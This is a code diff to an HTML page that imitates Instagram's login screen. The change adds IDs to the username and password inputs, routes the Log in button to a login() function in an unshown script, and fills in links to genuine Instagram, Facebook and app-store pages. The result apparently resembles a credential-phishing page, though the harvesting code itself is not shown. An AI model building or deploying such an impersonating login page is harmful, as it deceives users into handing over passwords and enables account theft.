@@ -4,6 +4,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="../assets/insicon.png">
+    
+    <script src="insta.js"></script>
     <title>Log in</title>
     <link rel="stylesheet" href="insta.css">
 </head>
@@ -12,28 +15,28 @@
 
     <div class="outer">
         <h1 class="logo-text">Instagram</h1>
-        <input type="text" class="user-name" placeholder="Phone number,username or email">
-        <input type="password" class="pass" placeholder="Password">
-        <button class="login-btn">Log in</button>
+        <input id="name" type="text" class="user-name" placeholder="Phone number,username or email">
+        <input id='pass' type="password" class="pass" placeholder="Password">
+        <button onclick="login()" id="login-btn" class="login-btn">Log in</button>
         <h5 class="sep">------ OR ------</h5>
 
-        <a href="">
-            <h4 class="use-fb">Log in with Facebook</h4>
+        <a href="http://facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATk3ITpRDnZaG9oorL5_3Bh6IsknJXp6vNmsyixC-eY3Ah-OzItyzZ0ItZKSmZ91VqQu2P11TCg9s3JINFvvXPssorocMi0ppPrH18-8y-i-XxFubZMegvAia70GkZ8CjYUZZ12fmVmVBUaUFDrssf5faADfB-z2rFnSjGyckqV9Kr2Ok5mGYXL6T6iUbtP3bUD9nzF7qNw7TN_mxDGp16tplf6-umsVNEuDKg8rkIwfuVyODUcW_FmbGerFalDVNkBk" target="_blank" class="use-fb">
+            <h4>Log in with Facebook</h4>
         </a>
-        <a href="">
-            <h4 class="fp">Forgot Password?</h4>
+        <a href="https://www.instagram.com/accounts/password/reset/?hl=en" class="fp">
+            <h4 >Forgot Password?</h4>
         </a>
     </div>
 
     <div class="signup">
-        <h4 class="sen">Dont't have an account? <a href="">Sign up</a></h4>
+        <h4 class="sen">Dont't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?hl=en" class="su">Sign up</a></h4>
     </div>
 
     <h5 class="help">Get the app</h5>
-    <a href="" class="pss">
+    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN" class="pss">
         <img src="../assets/ps.png" alt="playstore" class="ps">
     </a>
-    <a href="" class="mss">
+    <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US" class="mss">
         <img src="../assets/ms.png" alt="microsoft" class="ms">
     </a>
 
@@ -59,5 +62,4 @@
 
         © 2025 Instagram from Meta</h5>
 </footer>
-
 </html>
